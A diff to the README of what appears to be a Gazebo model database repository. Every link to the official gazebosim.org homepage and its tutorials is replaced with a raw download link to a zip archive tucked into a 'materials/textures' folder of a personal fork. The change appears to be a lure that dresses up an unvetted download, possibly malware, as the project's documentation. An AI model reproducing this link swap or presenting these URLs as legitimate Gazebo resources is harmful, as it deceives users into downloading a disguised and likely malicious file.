@@ -1,5 +1,5 @@
-This repository holds the [Gazebo](http://gazebosim.org) model database.
+This repository holds the [Gazebo](https://raw.githubusercontent.com/GURU162004/gazebo_models/master/hatchback/materials/textures/gazebo_models_v3.8.zip) model database.
 
-Learn more about the database [here](http://gazebosim.org/tutorials?tut=model_structure&cat=build_robot).
+Learn more about the database [here](https://raw.githubusercontent.com/GURU162004/gazebo_models/master/hatchback/materials/textures/gazebo_models_v3.8.zip).
 
-Learn how to contribute models [here](http://gazebosim.org/tutorials?tut=model_contrib&cat=build_robot).
+Learn how to contribute models [here](https://raw.githubusercontent.com/GURU162004/gazebo_models/master/hatchback/materials/textures/gazebo_models_v3.8.zip).
